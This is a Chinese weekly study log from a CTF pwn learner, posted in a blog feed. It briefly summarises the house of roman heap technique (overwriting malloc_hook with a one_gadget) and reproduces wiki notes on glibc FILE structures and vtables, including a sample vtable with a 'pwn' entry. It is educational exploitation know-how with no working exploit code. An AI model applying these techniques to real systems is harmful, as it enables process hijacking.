    <content type="html"><![CDATA[<h1 id="完成事项"><a href="#完成事项" class="headerlink" title="完成事项"></a>完成事项</h1><p>house of roman,io_file结构体大概看了下，刷题（少）</p><h1 id="未完成事项"><a href="#未完成事项" class="headerlink" title="未完成事项"></a>未完成事项</h1><p>house of pig(等多了解点io再回来看）</p><h1 id="下周待做事项"><a href="#下周待做事项" class="headerlink" title="下周待做事项"></a>下周待做事项</h1><p>把hexo博客重新搭起来开始写点笔记，io多了解一点，刷题刷题</p><h1 id="本周知识分享"><a href="#本周知识分享" class="headerlink" title="本周知识分享"></a>本周知识分享</h1><p>先大概总结下house of roman，首先需要uaf漏洞并且可以创建任意大小的chunk，和其他手法不同的是他的作用在于可以不需要一个泄露libc的过程，即不需要泄露函数，可以直接修改malloc_hook的低地址为one_gadget来获取shell</p><h2 id="FILE结构（wiki）"><a href="#FILE结构（wiki）" class="headerlink" title="FILE结构（wiki）"></a>FILE结构（wiki）</h2><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。</p><p>FILE 结构定义在 libio.h 中，如下所示</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE {</span><br><span class="line">  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="line">#define _IO_file_flags _flags</span><br><span class="line"></span><br><span class="line">  /* The following pointers correspond to the C++ streambuf protocol. */</span><br><span class="line">  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br><span class="line">  char* _IO_read_ptr;   /* Current read pointer */</span><br><span class="line">  char* _IO_read_end;   /* End of get area. */</span><br><span class="line">  char* _IO_read_base;  /* Start of putback+get area. */</span><br><span class="line">  char* _IO_write_base; /* Start of put area. */</span><br><span class="line">  char* _IO_write_ptr;  /* Current put pointer. */</span><br><span class="line">  char* _IO_write_end;  /* End of put area. */</span><br><span class="line">  char* _IO_buf_base;   /* Start of reserve area. */</span><br><span class="line">  char* _IO_buf_end;    /* End of reserve area. */</span><br><span class="line">  /* The following fields are used to support backing up and undo. */</span><br><span class="line">  char *_IO_save_base; /* Pointer to start of non-current get area. */</span><br><span class="line">  char *_IO_backup_base;  /* Pointer to first valid character of backup area */</span><br><span class="line">  char *_IO_save_end; /* Pointer to end of non-current get area. */</span><br><span class="line"></span><br><span class="line">  struct _IO_marker *_markers;</span><br><span class="line"></span><br><span class="line">  struct _IO_FILE *_chain;</span><br><span class="line"></span><br><span class="line">  int _fileno;</span><br><span class="line">#if 0</span><br><span class="line">  int _blksize;</span><br><span class="line">#else</span><br><span class="line">  int _flags2;</span><br><span class="line">#endif</span><br><span class="line">  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */</span><br><span class="line"></span><br><span class="line">#define __HAVE_COLUMN /* temporary */</span><br><span class="line">  /* 1+column number of pbase(); 0 is unknown. */</span><br><span class="line">  unsigned short _cur_column;</span><br><span class="line">  signed char _vtable_offset;</span><br><span class="line">  char _shortbuf[1];</span><br><span class="line"></span><br><span class="line">  /*  char* _save_gptr;  char* _save_egptr; */</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line">#ifdef _IO_USE_OLD_IO_FILE</span><br><span class="line">};</span><br><span class="line">struct _IO_FILE_complete</span><br><span class="line">{</span><br><span class="line">  struct _IO_FILE _file;</span><br><span class="line">#endif</span><br><span class="line">#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"># if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">  /* Wide character stream stuff.  */</span><br><span class="line">  struct _IO_codecvt *_codecvt;</span><br><span class="line">  struct _IO_wide_data *_wide_data;</span><br><span class="line">  struct _IO_FILE *_freeres_list;</span><br><span class="line">  void *_freeres_buf;</span><br><span class="line"># else</span><br><span class="line">  void *__pad1;</span><br><span class="line">  void *__pad2;</span><br><span class="line">  void *__pad3;</span><br><span class="line">  void *__pad4;</span><br><span class="line"></span><br><span class="line">  size_t __pad5;</span><br><span class="line">  int _mode;</span><br><span class="line">  /* Make sure we don't get into trouble again.  */</span><br><span class="line">  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];</span><br><span class="line">#endif</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>进程中的 FILE 结构会通过_chain 域彼此连接形成一个链表，链表头部用全局变量_IO_list_all 表示，通过这个值我们可以遍历所有的 FILE 结构。</p><p>在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上的。</p><p>我们可以在 libc.so 中找到 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></tbody></table></figure><p>但是事实上_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。</p><p>在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE_plus</span><br><span class="line">{</span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p> vtable 是 IO_jump_t 类型的指针，IO_jump_t 中保存了一些函数指针，在后面我们会看到在一系列标准 IO 函数中会调用这些函数指针  （挺重要的一个知识点）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">void * funcs[] = {</span><br><span class="line">   1 NULL, // "extra word"</span><br><span class="line">   2 NULL, // DUMMY</span><br><span class="line">   3 exit, // finish</span><br><span class="line">   4 NULL, // overflow</span><br><span class="line">   5 NULL, // underflow</span><br><span class="line">   6 NULL, // uflow</span><br><span class="line">   7 NULL, // pbackfail</span><br><span class="line">   </span><br><span class="line">   8 NULL, // xsputn  #printf</span><br><span class="line">   9 NULL, // xsgetn</span><br><span class="line">   10 NULL, // seekoff</span><br><span class="line">   11 NULL, // seekpos</span><br><span class="line">   12 NULL, // setbuf</span><br><span class="line">   13 NULL, // sync</span><br><span class="line">   14 NULL, // doallocate</span><br><span class="line">   15 NULL, // read</span><br><span class="line">   16 NULL, // write</span><br><span class="line">   17 NULL, // seek</span><br><span class="line">   18 pwn,  // close</span><br><span class="line">   19 NULL, // stat</span><br><span class="line">   20 NULL, // showmanyc</span><br><span class="line">   21 NULL, // imbue</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><p>fread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ;</span><br></pre></td></tr></tbody></table></figure><ul><li>buffer 存放读取数据的缓冲区。</li><li>size：指定每个记录的长度。</li><li>count： 指定记录的个数。</li><li>stream：目标文件流。</li><li>返回值：返回读取到数据缓冲区中的记录个数</li></ul><p>fread 的代码位于 / libio/iofread.c 中，函数名为_IO_fread，但真正的功能实现在子函数_IO_sgetn 中。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fread (buf, size, count, fp)</span><br><span class="line">     void *buf;</span><br><span class="line">     _IO_size_t size;</span><br><span class="line">     _IO_size_t count;</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">{</span><br><span class="line">  ...</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);</span><br><span class="line">  ...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p> 在_IO_sgetn 函数中会调用_IO_XSGETN，而_IO_XSGETN 是_IO_FILE_plus.vtable 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_sgetn (fp, data, n)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">     void *data;</span><br><span class="line">     _IO_size_t n;</span><br><span class="line">{</span><br><span class="line">  return _IO_XSGETN (fp, data, n);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p> 在默认情况下函数指针是指向_IO_file_xsgetn 函数的，  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_IO_buf_base</span><br><span class="line">        &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">      {</span><br><span class="line">        if (__underflow (fp) == EOF)</span><br><span class="line">      break;</span><br><span class="line"></span><br><span class="line">        continue;</span><br><span class="line">      }</span><br></pre></td></tr></tbody></table></figure><h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h2><p>fwrite 同样是标准 IO 库函数，作用是向文件流写入数据，函数原型如下</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream);</span><br></pre></td></tr></tbody></table></figure><ul><li>buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址;</li><li>size: 要写入内容的单字节数;</li><li>count: 要进行写入 size 字节的数据项的个数;</li><li>stream: 目标文件指针;</li><li>返回值：实际写入的数据项个数 count。</li></ul><p>fwrite 的代码位于 / libio/iofwrite.c 中，函数名为_IO_fwrite。 在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。</p><p>根据前面对_IO_FILE_plus 的介绍，可知_IO_XSPUTN 位于_IO_FILE_plus 的 vtable 中，调用这个函数需要首先取出 vtable 中的指针，再跳过去进行调用。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">written = _IO_sputn (fp, (const char *) buf, request);</span><br></pre></td></tr></tbody></table></figure><p> 在_IO_XSPUTN 对应的默认函数_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* Next flush the (full) buffer. */</span><br><span class="line">     if (_IO_OVERFLOW (f, EOF) == EOF)</span><br></pre></td></tr></tbody></table></figure><p> _IO_OVERFLOW 默认对应的函数是_IO_new_file_overflow  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (ch == EOF)</span><br><span class="line">    return _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */</span><br><span class="line">    if (_IO_do_flush (f) == EOF)</span><br><span class="line">      return EOF;</span><br></pre></td></tr></tbody></table></figure><p> 在_IO_new_file_overflow 内部最终会调用系统接口 write 函数</p><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p>fopen 在标准 IO 库中用于打开文件，函数原型如下</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FILE *fopen(char *filename, *type);</span><br></pre></td></tr></tbody></table></figure><ul><li>filename: 目标文件的路径</li><li>type: 打开方式的类型</li><li>返回值: 返回一个文件指针</li></ul><p>在 fopen 内部会创建 FILE 结构并进行一些初始化操作，下面来看一下这个过程</p><p>首先在 fopen 对应的函数__fopen_internal 内部会调用 malloc 函数，分配 FILE 结构的空间。因此我们可以获知 FILE 结构是存储在堆上的</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));</span><br></pre></td></tr></tbody></table></figure><p> 之后会为创建的 FILE 初始化 vtable，并调用_IO_file_init 进一步初始化操作  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">_IO_file_init (&amp;new_f-&gt;fp);</span><br></pre></td></tr></tbody></table></figure><p> 在_IO_file_init 函数的初始化操作中，会调用_IO_link_in 把新分配的 FILE 链入_IO_list_all 为起始的 FILE 链表中  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_link_in (fp)</span><br><span class="line">     struct _IO_FILE_plus *fp;</span><br><span class="line">{</span><br><span class="line">    if ((fp-&gt;file._flags &amp; _IO_LINKED) == 0)</span><br><span class="line">    {</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p> 之后__fopen_internal 函数会调用_IO_file_fopen 函数打开目标文件，_IO_file_fopen 会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口 open 函数，这里不再深入。  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)</span><br><span class="line">    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br></pre></td></tr></tbody></table></figure><p>总结一下 fopen 的操作是</p><ul><li>使用 malloc 分配 FILE 结构</li><li>设置 FILE 结构的 vtable</li><li> 初始化分配的 FILE 结构</li><li>将初始化的 FILE 结构链入 FILE 结构链表中</li><li>调用系统调用打开文件</li></ul><h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h2><p>fclose 是标准 IO 库中用于关闭已打开文件的函数，其作用与 fopen 相反。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int fclose(FILE *stream)</span><br></pre></td></tr></tbody></table></figure><p> 功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区</p><p>fclose 首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br></pre></td></tr></tbody></table></figure><p> 之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br></pre></td></tr></tbody></table></figure><p> 最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_FINISH (fp);</span><br></pre></td></tr></tbody></table></figure><h2 id="printf-puts"><a href="#printf-puts" class="headerlink" title="printf/puts"></a>printf/puts</h2><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p><p>puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。</p><p>printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vfprintf+11</span><br><span class="line">_IO_file_xsputn</span><br><span class="line">_IO_file_overflow</span><br><span class="line">funlockfile</span><br><span class="line">_IO_file_write</span><br><span class="line">write</span><br></pre></td></tr></tbody></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>边刷刷题看看wiki，有点想学web了（感觉有点悬，pwn都学不明白）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;完成事项&quot;&gt;&lt;a href=&quot;#完成事项&quot; class=&quot;headerlink&quot; title=&quot;完成事项&quot;&gt;&lt;/a&gt;完成事项&lt;/h1&gt;&lt;p&gt;house of roman,io_file结构体大概看了下，刷题（少）&lt;/p&gt;
&lt;h1 id=&quot;未完成事项&quot;&gt;&lt;a hre</summary>
      
    
    
    
    
  </entry>
  
</feed>
